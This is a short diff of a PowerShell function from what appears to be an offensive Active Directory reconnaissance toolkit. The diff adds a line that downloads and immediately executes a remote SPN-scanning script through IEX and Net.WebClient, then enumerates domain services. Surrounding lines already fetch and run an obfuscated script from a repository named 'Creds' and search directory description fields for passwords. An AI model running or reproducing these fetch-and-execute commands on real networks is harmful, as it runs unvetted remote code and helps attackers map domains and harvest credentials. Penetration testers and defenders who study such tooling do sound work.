@@ -587,7 +587,9 @@ function domainreconmodules
             condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
             breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
-
+	    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/SPN-Scan.ps1')
+	    Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"
+	    
             #Search for AD-Passwords in description fields
             Write-Host -ForegroundColor Yellow 'Searching for passwords in active directory description fields..'
             
